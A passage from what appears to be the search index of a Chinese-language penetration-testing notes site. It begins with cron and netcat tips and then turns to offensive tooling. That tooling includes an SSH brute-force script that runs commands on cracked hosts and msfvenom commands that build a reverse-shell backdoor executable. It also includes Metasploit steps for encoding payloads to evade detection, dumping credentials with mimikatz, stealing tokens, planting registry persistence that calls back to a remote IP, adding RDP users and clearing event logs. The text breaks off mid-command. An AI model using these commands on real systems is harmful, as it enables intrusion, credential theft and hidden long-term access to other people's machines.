10\u91cd\u542fsmb \u547d\u4ee4\uff1a 10 1 * * 6,0 /etc/init.d/smb restart \u5b9e\u4f8b9\uff1a\u6bcf\u592918 : 00\u81f323 : 00\u4e4b\u95f4\u6bcf\u969430\u5206\u949f\u91cd\u542fsmb \u547d\u4ee4\uff1a 0,30 18-23 * * * /etc/init.d/smb restart \u5b9e\u4f8b10\uff1a\u6bcf\u661f\u671f\u516d\u7684\u665a\u4e0a11 : 00 pm\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 23 * * 6 /etc/init.d/smb restart \u5b9e\u4f8b11\uff1a\u6bcf\u4e00\u5c0f\u65f6\u91cd\u542fsmb \u547d\u4ee4\uff1a * */1 * * * /etc/init.d/smb restart \u5b9e\u4f8b12\uff1a\u665a\u4e0a11\u70b9\u5230\u65e9\u4e0a7\u70b9\u4e4b\u95f4\uff0c\u6bcf\u9694\u4e00\u5c0f\u65f6\u91cd\u542fsmb \u547d\u4ee4\uff1a * 23-7/1 * * * /etc/init.d/smb restart \u5b9e\u4f8b13\uff1a\u6bcf\u6708\u76844\u53f7\u4e0e\u6bcf\u5468\u4e00\u5230\u5468\u4e09\u768411\u70b9\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 11 4 * mon-wed /etc/init.d/smb restart \u5b9e\u4f8b14\uff1a\u4e00\u6708\u4e00\u53f7\u76844\u70b9\u91cd\u542fsmb \u547d\u4ee4\uff1a 0 4 1 jan * /etc/init.d/smb restart \u5b9e\u4f8b15\uff1a\u6bcf\u5c0f\u65f6\u6267\u884c/etc/cron.hourly\u76ee\u5f55\u5185\u7684\u811a\u672c \u547d\u4ee4\uff1a 01 * * * * root run-parts /etc/cron.hourly \u8bf4\u660e\uff1a run-parts\u8fd9\u4e2a\u53c2\u6570\u4e86\uff0c\u5982\u679c\u53bb\u6389\u8fd9\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u540e\u9762\u5c31\u53ef\u4ee5\u5199\u8981\u8fd0\u884c\u7684\u67d0\u4e2a\u811a\u672c\u540d\uff0c\u800c\u4e0d\u662f\u76ee\u5f55\u540d\u4e86","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#curl","text":"\u63d0\u4ea4\u6587\u4ef6 curl -F \"imgFIle=@xx.html\" url","title":"Curl"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#nc","text":"-l port \u4fa6\u542c\u6a21\u5f0f\uff0c\u4e0d\u6307\u5b9a\u7aef\u53e3\u65f6\u4f1a\u9ed8\u8ba4\u9009\u62e9\u4e00\u4e2a\u7aef\u53e3 -s \u6307\u5b9a\u53d1\u9001\u6570\u636e\u7684\u6e90ip -u \u4f7f\u7528udp\uff0c\u9ed8\u8ba4tcp -v \u8f93\u51fa\u4fe1\u606f -w \u8d85\u65f6\u79d2\u6570 -z \u626b\u63cf\uff0c\u4e0d\u53d1\u9001\u6570\u636e \u76d1\u542c nc -lv 6666 \u626b\u63cf nc -zvw 3 1.1.1.1 6666 \u4f20\u8f93 \u63a5\u6536\u7aef nc -l 6666 < \u6211\u662f\u6587\u4ef6.txt \u53d1\u9001\u7aef nc -l 6666 > \u6211\u662f\u6587\u4ef6.txt \u626b\u63cf\u7aef\u53e3 nc -znv 1.1.1.1 1-65535 nc -v -w 1.1.1.1 -z 1-1000 Linux\u8bed\u6cd5 for i in {67}; do nc -vv -n -w 1 1.1.1.$i 8000 8010 8080 8081 80 443 -z; done Windows\u8bed\u6cd5 for /l %i in (2,1,100) do nc -znv 10.9.7.%i 8000 8010 8080 8081 80 443","title":"nc"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_9","text":"IPv4 \u5730\u5740 (?=(\\b|\\D))(((\\d{1,2})|(1\\d{1,2})|(2[0-4]\\d)|(25[0-5]))\\.){3}((\\d{1,2})|(1\\d{1,2})|(2[0-4]\\d)|(25[0-5]))(?=(\\b|\\D)) ((25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d) IPv6 \u5730\u5740 ^([\\\\da-fA-F]{1,4}:){7}([\\\\da-fA-F]{1,4})$ \\s+ \u8868\u793a1\u4e2a\u4ee5\u4e0a\u7a7a\u5b57\u7b26\u4e32 \\d \u4efb\u4f55\u4e00\u4f4d\u6570\u5b57 \\d{3} \u8fdb\u884c\u4e09\u6b21\u5339\u914d \u7531\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u542b\u6709\\ \uff0c\u659c\u6760\u9700\u8981\u7528\\\u8f6c\u4e49\uff0c\u4e3a\u4e86\u7b80\u4fbf\uff0c\u9700\u8981\u5728\u5b57\u7b26\u4e32\u524d\u9762\u7528r'\\d{3}' \u6807\u8bb0 \u8bf4\u660e\u5b57\u7b26\u4e32\u662f\u539f\u59cb\u5b57\u7b26\u4e32\u3002 \\D \u975e\u6570\u5b57\u5b57\u7b26 \\w \u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\W \u975e\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf \\s \u7a7a\u767d\u5b57\u7b26 \\S \u975e\u7a7a\u767d\u5b57\u7b26 \uff1f \u8868\u793a\u5339\u914d1\u6b21\u62160\u6b21 * \u8868\u793a\u5339\u914d0\u6b21\u6216\u4efb\u610f\u6b21 + \u8868\u793a\u5339\u914d1\u6b21\u6216\u4efb\u610f\u6b21 (x){3} \u8868\u793a\u5339\u914d\u7279\u5b9a\u6b21\uff0c{3,5}\u6307\u5b9a3\u6b21\u52305\u6b21\uff0c{,3}0\u6b21\u52303\u6b21\uff0c{3,}3\u6b21\u5230\u591a\u6b21\u3002\u6307\u5b9a\uff1f\u8868\u793a\u975e\u8d2a\u5fc3\u5339\u914d ^ \u65b9\u62ec\u53f7\u540e\u8868\u793a\u975e\uff1b\u5b57\u7b26\u5f00\u59cb\u5904\u8868\u793a\u8d77\u59cb % \u5b57\u7b26\u5c3e\u90e8\u8868\u793a\u7ed3\u675f . \u8868\u793a\u6362\u884c\u5916\u7684\u6240\u6709\u5b57\u7b26\uff0c\u53ea\u5339\u914d1\u4e2a\u5b57\u7b26","title":"\u6b63\u5219"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_10","text":"","title":"\u5176\u4ed6\u811a\u672c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#ssh","text":"# -*- coding: utf-8 -*- # @Time : 2019-02-26 15:09 # @Author : 00theway # @File : brute_ssh.py # @Software: PyCharm import paramiko, time import threading from queue import Queue import socket class Brute_ssh(threading.Thread): def __init__(self, ips, users, command): threading.Thread.__init__(self) self.ips = ips self.command = command self.users = users def run(self): print('thread start', threading.currentThread().name) while not self.ips.empty(): ip = self.ips.get() for username,password in self.users: try: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) try: ssh.connect(ip, 22, username, password=password, timeout=60) print('connect %s %s:%s success' % (ip, username, password)) time.sleep(1) stdin, stdout, stderr = ssh.exec_command(command) out = ''.join(stdout.readlines()) print(ip, out) open(ip + '.txt', 'a+').write(out) except: print('connect %s failed' % ip) ssh.close() except Exception as e: print(e) print('thread end', threading.currentThread().name) if __name__ == '__main__': #command = 'ping -c 1 10.1.1.1' command = 'ping -c 1 10.1.1.1' #command = 'ping -c 1 10.1.1.1' users = [ ('lifepay','lifepay'), #('root','P@ssw0rd'), #('oracle','oracle'), #('weblogic','weblogic') ] ips = ''' 10.1.1.1 10.1.1.2 ''' deploy_pools = [] ips_q = Queue() for item in ips.splitlines(): ips_q.put(item) # # for i in range(255): # ip = '10.194.172.%s' % i # ips.put((ip, '22')) for _ in range(5): deploy_pools.append(Brute_ssh(ips_q, users, command)) for worker in deploy_pools: worker.start() for worker in deploy_pools: worker.join()","title":"\u4f7f\u7528ssh\u6279\u91cf\u6267\u884c\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#jsweb-base64","text":"\u5bf9\u76d1\u542c\u5230\u7684base64\u6570\u636e\u8fdb\u884c\u89e3\u7801 var http = require('http'); var querystring = require('querystring'); http.createServer(function (req, res) { var body = ''; var bbase64=req.url rbase64 = bbase64.substring(1) var base64ToStr = new Buffer(rbase64 , 'base64').toString(); console.log('req.url:',base64ToStr); req.on('data', function (chunk) { body += chunk; console.log(\"chunk:\",chunk); }); req.on('end', function () { body = querystring.parse(body); console.log('body:',body); res.write('Message from server'); res.end(); }); }).listen(800,'0.0.0.0');","title":"js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668-\u89e3\u7801base64"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#jsweb","text":"\u4e0d\u89e3\u7801\u76f4\u63a5\u8fd4\u56de\u539f\u59cb\u6570\u636e var http = require('http'); var querystring = require('querystring'); http.createServer(function (req, res) { var body = ''; //var bbase64=req.url //rbase64 = bbase64.substring(1) //var base64ToStr = new Buffer(rbase64 , 'base64').toString(); //console.log('req.url:',base64ToStr); console.log('req.url:',body); req.on('data', function (chunk) { body += chunk; console.log(\"chunk:\",chunk); }); req.on('end', function () { body = querystring.parse(body); console.log('body:',body); res.write('Message from server'); res.end(); }); }).listen(800,'0.0.0.0');","title":"js\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#ncweb_1","text":"while true; do ( echo -e 'HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nAccess-Control-Allow-Origin:*\\r\\n'; echo -e \"{\\\"code\\\":\\\"0\\\",\\\"data\\\":{\\\"success\\\":true}}\\n\" ) | nc -lp 9527; done","title":"\u4f7f\u7528NC\u5f00\u542f\u4e00\u4e2aweb\u76d1\u542c\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#nmap","text":"#!/bin/bash bak=$IFS if [ $# -ne 1 ];then echo \"Usage $0 IPfile\" exit fi if [ ! -f $1 ];then echo \"the $1 is not a file\" exit fi echo -n \"speed 0-5 : \" read s IFS=$'\\n' for i in `cat $1` do nmap -PA -PS -P0 -sS $i -r -T $s -p1-65535 --open done IFS=$bak","title":"nmap\u6307\u5b9a\u7ea7\u522b\u6279\u91cf\u626b\u63cf"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_11","text":"a\u6bb5 #!/bin/bash net=10 for k in {0..255} do for j in {0..255} do for i in 1 254; do ping -c 1 -w 1 $net.$k.$j.$i | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$k.$j.$i is alive ! || >> ascan.txt else echo $net.$k.$j.$i May be not exist ! fi done done done b\u6bb5 #!/bin/bash net=192.168 for j in {0..255} do for i in 1 254; do ping -c 1 -w 1 $net.$j.$i | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$j.$i is alive ! || >> bscan.txt else echo $net.$j.$i May be not exist ! fi done done c\u6bb5 #!/bin/bash net=192.168.148 for j in {0..255} do ping -c 1 -w 1 $net.$j | grep \"ttl=\" >/dev/null 2>&1 if [ $? -eq 0 ];then echo $net.$j is alive ! || >> cscan.txt else echo $net.$j May be not exist ! fi done","title":"\u5185\u7f51\u7f51\u5173\u63a2\u6d4b\u811a\u672c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_12","text":"ssh -o UserKnownHostsFile=/dev/null -T root@10.1.1.1 /bin/bash -i","title":"\u65e0\u8fde\u63a5\u75d5\u8ff9"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_13","text":"find /web -name *.jsp | xargs tar cvf /tmp/web.tar find /home/JavaProjects/1234/ -name '*.jsp' | xargs tar cvf /tmp/1234.tgz","title":"\u590d\u5236\u6307\u5b9a\u6587\u4ef6\u5e76\u6253\u5305"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#shell","text":"python -c 'import pty; pty.spawn(\"/bin/sh\")' ctrl + z stty raw -echo;fg","title":"\u4ea4\u4e92\u5f0fshell"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#_14","text":"#!/bin/bash process_name=\"javawc\" restart_command=\"nohup /tmp/javawc run --config 1.json > /dev/null 2>&1 &\" while true; do if pgrep -x \"$process_name\" >/dev/null; then sleep 1 else eval \"$restart_command\" echo \"Process '$process_name' has been restarted.\" fi done","title":"\u8fdb\u7a0b\u5b88\u62a4\u811a\u672c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Linux%E6%8A%80%E5%B7%A7/#sshkill","text":"\u4e0d\u7ba1\u600e\u4e48\u540e\u53f0\u8fd0\u884c\uff0c\u4e0d\u7ba1\u7528\u4ec0\u4e48\u547d\u4ee4\uff0c\u53ea\u8981\u9000\u51fassh\u4f1a\u8bdd\u8fdb\u7a0b\u5c31kill\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a\u767b\u5f55ssh\u540e\u5148 su \u7528\u6237\u540d \uff0c\u518d\u8fd0\u884c\u7a0b\u5e8f\u5c31\u4e0d\u4f1akill\u4e86\u3002","title":"\u540e\u53f0\u8fd0\u884c\u7684\u7a0b\u5e8f\u9000\u51fassh\u540e\u4f1a\u81ea\u52a8kill"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/","text":"title: metasploit\u547d\u4ee4\u6574\u7406 date: 2021-03-23 11:01:17 \u5217\u51fapayload msfvenom --list payloads | awk '{print $1}' \u751f\u6210shellcode msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.131 lport=6666 -f exe -o backdoor.exe \u4ee5\u4e0a\u7684\u65b9\u5f0f\u4e0d\u592a\u65b9\u4fbf\uff0c\u4ee5\u4e0b\u65b9\u5f0f\u66f4\u65b9\u4fbf \u5728msf\u547d\u4ee4\u884c\u4e0buse payload generate -f raw -o 1.bin \u6d41\u91cf\u7684\u52a0\u5bc6\u4e0e\u6df7\u6dc6 \u666e\u901a\u7684payload\u6d41\u91cf\u662f\u4e00\u5b9a\u4f1a\u88ab\u8bc6\u522b\u5230\u7684\uff0c\u53ef\u4ee5\u91c7\u53d6\u51e0\u4e2a\u65b9\u6cd5\u8fdb\u884c\u5bf9\u6297 \u5355\u7eaf\u6df7\u6dc6 msf5 exploit(multi/handler) > set enablestageencoding true enablestageencoding => true msf5 exploit(multi/handler) > set stageencoder x86/shikata_ga_nai TLS\u52a0\u5bc6 \u4f7f\u7528auxiliary/gather/impersonate_ssl\u4f2a\u9020\u76ee\u6807\u7ad9\u70b9\u8bc1\u4e66 \u5728handle\u4f7f\u7528 set handlersslcert *.pem \u52a0\u8f7dpem\u8bc1\u4e66 RC4\u52a0\u5bc6 \u4f7f\u7528RC4\u52a0\u5bc6\u7684payload payload windows/x64/meterpreter/bind_tcp_rc4 \u76d1\u542c \u4ee5\u4e0b\u6587\u4ef6\u4fdd\u5b58\u4e3ax.rb\uff0c\u4f7f\u7528-r\u53c2\u6570\u52a0\u8f7d\u6587\u4ef6\u3002 \u6240\u6709\u547d\u4ee4\u90fd\u53ef\u4ee5\u5199\u6210\u8fd9\u4e48\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u52a0\u8f7d use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 192.168.17.131 set LPORT 6666 set ExitOnSession false set SessionCommunicationTimeout 0 exploit \u52a0\u8f7d\u6587\u4ef6\u7684\u76d1\u542c\u65b9\u5f0f\u786e\u5b9e\u6bd4\u81ea\u5df1\u624b\u52a8\u6572\u547d\u4ee4\u5feb\uff0c\u4f46\u66f4\u5feb\u7684\u662f\u4e0b\u9762\u7684\u547d\u4ee4 handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp \u6301\u7eed\u76d1\u542c \u53ef\u4ee5\u5728\u63a5\u6536\u5230seesion\u540e\u7ee7\u7eed\u76d1\u542c\u7aef\u53e3 set ExitOnSession false \u9632\u6b62session\u8d85\u65f6\u9000\u51fa \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u4e00\u4e2a\u4f1a\u8bdd\u5c06\u57285\u5206\u949f\uff08300\u79d2\uff09\u6ca1\u6709\u4efb\u4f55\u6d3b\u52a8\uff0c\u90a3\u4e48\u5b83\u4f1a\u88ab\u6740\u6b7b,\u4e3a\u9632\u6b62\u6b64\u60c5\u51b5\u53ef\u5c06\u6b64\u9879\u4fee\u6539\u4e3a0 set SessionCommunicationTimeout 0 \u9632\u6b62session\u5f3a\u5236\u5173\u95ed \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u661f\u671f\uff08604800\u79d2\uff09\u540e\uff0c\u4f1a\u8bdd\u5c06\u88ab\u5f3a\u5236\u5173\u95ed,\u4fee\u6539\u4e3a0\u53ef\u6c38\u4e45\u4e0d\u4f1a\u88ab\u5173\u95ed set SessionExpirationTimeout 0 meterpreter\u7684\u5404\u79cd\u547d\u4ee4 \u6587\u4ef6\u64cd\u4f5c cat c:\\boot.ini #\u67e5\u770b\u6587\u4ef6\u5185\u5bb9,\u6587\u4ef6\u5fc5\u987b\u5b58\u5728 del c:\\boot.ini #\u5220\u9664\u6307\u5b9a\u7684\u6587\u4ef6 download nimeia.txt /root/Desktop/ #\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u673a\u4e0a edit c:\\boot.ini # \u7f16\u8f91\u6587\u4ef6 getlwd #\u6253\u5370\u672c\u5730\u76ee\u5f55 getwd #\u6253\u5370\u5de5\u4f5c\u76ee\u5f55 lcd #\u66f4\u6539\u672c\u5730\u76ee\u5f55 ls #\u5217\u51fa\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u5217\u8868 lpwd #\u6253\u5370\u672c\u5730\u76ee\u5f55 pwd #\u8f93\u51fa\u5de5\u4f5c\u76ee\u5f55 cd c:\\\\ #\u8fdb\u5165\u76ee\u5f55\u6587\u4ef6\u4e0b rm file #\u5220\u9664\u6587\u4ef6 mkdir dier #\u5728\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u7684\u521b\u5efa\u76ee\u5f55 rmdir #\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u5220\u9664\u76ee\u5f55 dir #\u5217\u51fa\u76ee\u6807\u4e3b\u673a\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u4fe1\u606f mv #\u4fee\u6539\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u6587\u4ef6\u540d upload /root/backdoor.exe c:\\\\users\\\\arche\\\\AppData\\\\local\\\\backdoor.exe #\u4e0a\u4f20\u6587\u4ef6 search -d d:\\\\www -f web.config #search \u6587\u4ef6\uff0c\u5982search -d c:\\\\ -f*.doc search -f autoexec.bat #\u641c\u7d22\u6587\u4ef6 search -f sea*.bat c:\\\\xamp\\\\ \u6a21\u5757\u52a0\u8f7d load mimakatz #\u4e0d\u7528\u591a\u8bf4 help mimikatz \u67e5\u770b\u5e2e\u52a9 wdigest #\u83b7\u53d6Wdigest\u5bc6\u7801 mimikatz_command -f samdump::hashes #\u6267\u884cmimikatz\u539f\u59cb\u547d\u4ee4 mimikatz_command -f sekurlsa::searchPasswords load powershell #\u6267\u884cpowershell\u547d\u4ee4 load espia #\u622a\u56fe\u7684 load extapi #\u989d\u5916\u6a21\u5757\uff0c\u4e00\u822c\u7528\u4e0d\u5230 load lanattacks #\u5185\u7f51\u653b\u51fb\u6a21\u5757 \u547d\u4ee4\u6267\u884c\u3001\u901a\u9053\u3001\u4ee4\u724c \u5173\u4e8e\u547d\u4ee4\u6267\u884c\uff0c\u53ef\u4f7f\u7528\u8fdb\u5165\u4ea4\u4e92\u5f0fshell\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u52a0\u8f7dpowershell\u6a21\u5757\u6267\u884c\u547d\u4ee4\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528execute\u540e\u53f0\u6267\u884c\uff0c\u5c06\u547d\u4ee4\u653e\u5165channel\u3002\u8fd9\u91cc\u4e3b\u8981\u8bb0\u5f55\u4e00\u4e0bexecute\uff0c\u5728\u63d0\u6743\u65f6\u53ef\u80fd\u6709\u7528\u3002 execute #\u6267\u884ccmd -d \u5728\u76ee\u6807\u4e3b\u673a\u6267\u884c\u65f6\u663e\u793a\u7684\u8fdb\u7a0b\u540d\u79f0\uff08\u7528\u4ee5\u4f2a\u88c5\uff09 -m \u76f4\u63a5\u4ece\u5185\u5b58\u4e2d\u6267\u884c execute -cH -f #c\u662f\u5c06\u547d\u4ee4\u4e22\u5230\u901a\u9053\u4e2d channel -r 4 #\u67e5\u770b\u901a\u9053\u7684\u6267\u884c\u7ed3\u679c use incognito execute -cH -f #\u547d\u4ee4 list_tokens -g impersonate_token 'NT AUTHORITY\\NTLM Authentication' \u4f7f\u7528\u4ee4\u724c steal_token pid \u5077\u4ee4\u724c migrate pid \u6ce8\u5165\u8fdb\u7a0b\\\u8fdb\u7a0b\u8f6c\u79fb \u8def\u7531\u53ca\u8f6c\u53d1 \u83b7\u53d6\u672c\u5730\u7f51\u7edc run get_local_subnets \u6dfb\u52a0\u8def\u7531 run autoroute -s 10.10.87.0/27 \u7aef\u53e3\u8f6c\u53d1\uff0c\u6307\u5c06\u672c\u673a(\u88ab\u63a7\u673a)\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7a0bIP(msf\u670d\u52a1\u7aef)\u7684\u7aef\u53e3 portfwd add -l 3389 -r 192.168.206.200 -p 3389 \u6743\u9650\u7ef4\u6301\u76f8\u5173 persistence\u542f\u52a8\u9879\u540e\u95e8 \u8fd9\u4e2a\u540e\u95e8\u5bb9\u6613\u88ab\u6740\uff0c\u53ef\u4ee5\u81ea\u884c\u5199\u5165\u514d\u6740\u7684\u9a6c\u5230\u6ce8\u518c\u8868\u4e2d\u3002\u5f53\u7136\u8981\u5148\u4e0a\u4f20\u9a6c run persistence -X -i 10 -p 6666 -r 103.45.188.176 -X \u7cfb\u7edf\u5f00\u673a\u81ea\u542f -i 10 10\u79d2\u91cd\u8fde\u4e00\u6b21 -p \u76d1\u542c\u7aef\u53e3 -r \u76d1\u542c\u673a\u79fb\u9664 persistence \u540e\u95e8\u7684\u529e\u6cd5\u662f\u5220\u9664 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ \u4e2d\u7684\u6ce8\u518c\u8868\u952e\u548c C:\\WINDOWS\\TEMP\\ \u4e2d\u7684 VBScript \u6587\u4ef6\u3002 reg setval -k HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v backdoor -d c:\\\\users\\\\xxx\\\\AppData\\\\local\\\\backdoor.exe metsvc\u670d\u52a1\u540e\u95e8 \u8fd9\u4e2a\u4e5f\u4e0d\u884c\uff0c\u6743\u9650\u7ef4\u6301\u8fd8\u662f\u7528\u5176\u4ed6\u65b9\u6cd5\u6765\u505a\u6bd4\u8f83\u597d run metsvc \u2013A #\u81ea\u52a8\u5b89\u88c5\u540e\u95e8 \u5f00\u542fRDP getgui run getgui \u2013h #\u67e5\u770b\u5e2e\u52a9 run getgui -e #\u5f00\u542f\u8fdc\u7a0b\u684c\u9762 run getgui -u lltest2 -p 123456 #\u6dfb\u52a0\u7528\u6237 run getgui -f 6661 -e #3389\u7aef\u53e3\u8f6c\u53d1\u52306661 run post/windows/manage/enable_rdp enable_rdp\u811a\u672c run post/windows/manage/enable_rdp #\u5f00\u542f\u8fdc\u7a0b\u684c\u9762 run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=123456 #\u6dfb\u52a0\u7528\u6237 run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #\u5c063389\u7aef\u53e3\u8f6c\u53d1\u52306662 \u811a\u672c\u4f4d\u4e8e/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb \u901a\u8fc7enable_rdp.rb\u811a\u672c\u53ef\u77e5\uff1a\u5f00\u542frdp\u662f\u901a\u8fc7reg\u4fee\u6539\u6ce8\u518c\u8868\uff1b\u6dfb\u52a0\u7528\u6237\u662f\u8c03\u7528cmd.exe \u901a\u8fc7net user\u6dfb\u52a0\uff1b\u7aef\u53e3\u8f6c\u53d1\u662f\u5229\u7528\u7684portfwd\u547d\u4ee4 \u6e05\u9664\u65e5\u5fd7 clearev \u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7 Msfconsole\u4e0b\u7684\u6a21\u5757 \u6a21\u5757\u6211\u6ca1\u6709\u8bb0\u5f55\uff0c\u56e0\u4e3a\u5b83\u7684\u6a21\u5757\u90fd\u662f\u5f88\u6709\u89c4\u5219\u7684\uff0c\u4e0d\u9700\u8981\u4e00\u4e2a\u4e2a\u8bb0\u5b83\u3002\u6bd4\u5982\u626b\u63cf\u7c7b\u7684\u90fd\u662fscanner\u6253\u5934\uff0c\u5229\u7528\u7c7b\u7684\u90fd\u662fexploit\u3001misc\u6253\u5934\u3002\u5b9e\u5728\u4e0d\u884c\u8fd8\u6709search\u547d\u4ee4\uff0c\u6240\u4ee5\u8bb0\u6a21\u5757\u6ca1\u7528\uff0c\u8bb0\u4f4f\u5927\u6982\u5c31\u884c\u4e86\u3002 \u4ee5\u4e0a\u3002 ![[Pasted image 20230523150052.png]]","title":"MSF\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#title-metasploit-date-2021-03-23-110117","text":"","title":"title: metasploit\u547d\u4ee4\u6574\u7406 date: 2021-03-23 11:01:17"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#payload","text":"msfvenom --list payloads | awk '{print $1}'","title":"\u5217\u51fapayload"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#shellcode","text":"msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.131 lport=6666 -f exe -o backdoor.exe \u4ee5\u4e0a\u7684\u65b9\u5f0f\u4e0d\u592a\u65b9\u4fbf\uff0c\u4ee5\u4e0b\u65b9\u5f0f\u66f4\u65b9\u4fbf \u5728msf\u547d\u4ee4\u884c\u4e0buse payload generate -f raw -o 1.bin","title":"\u751f\u6210shellcode"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_1","text":"\u666e\u901a\u7684payload\u6d41\u91cf\u662f\u4e00\u5b9a\u4f1a\u88ab\u8bc6\u522b\u5230\u7684\uff0c\u53ef\u4ee5\u91c7\u53d6\u51e0\u4e2a\u65b9\u6cd5\u8fdb\u884c\u5bf9\u6297","title":"\u6d41\u91cf\u7684\u52a0\u5bc6\u4e0e\u6df7\u6dc6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_2","text":"msf5 exploit(multi/handler) > set enablestageencoding true enablestageencoding => true msf5 exploit(multi/handler) > set stageencoder x86/shikata_ga_nai","title":"\u5355\u7eaf\u6df7\u6dc6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#tls","text":"\u4f7f\u7528auxiliary/gather/impersonate_ssl\u4f2a\u9020\u76ee\u6807\u7ad9\u70b9\u8bc1\u4e66 \u5728handle\u4f7f\u7528 set handlersslcert *.pem \u52a0\u8f7dpem\u8bc1\u4e66","title":"TLS\u52a0\u5bc6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#rc4","text":"\u4f7f\u7528RC4\u52a0\u5bc6\u7684payload payload windows/x64/meterpreter/bind_tcp_rc4","title":"RC4\u52a0\u5bc6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E5%91%BD%E4%BB%A4/#_3","text":"\u4ee5\u4e0b\u6587\u4ef6\u4fdd\u5b58\u4e3ax.rb\uff0c\u4f7f\u7528-r\u53c2\u6570\u52a0\u8f7d\u6587\u4ef6\u3002 \u6240\u6709\u547d\u4ee4\u90fd\u53ef\u4ee5\u5199\u6210\u8fd9\u4e48\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u52a0\u8f7d use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 192.168.17.131 set LPORT 6666 set ExitOnSession false set SessionCommunicationTimeout 0 exploit \u52a0\u8f7d\u6587\u4ef6\u7684\u76d1\u542c\u65b9\u5f0f\u786e\u5b9e\u6bd4\u81ea\u5df1\u624b\u52a8\u6572\u547d\u4ee4\u5feb\uff0c\u4f46\u66f4\u5feb\u7684\u662f\u4e0b\u9762\u7684\u547d\u4ee4 handler -H 10.211.55.2 -P 3333 -p 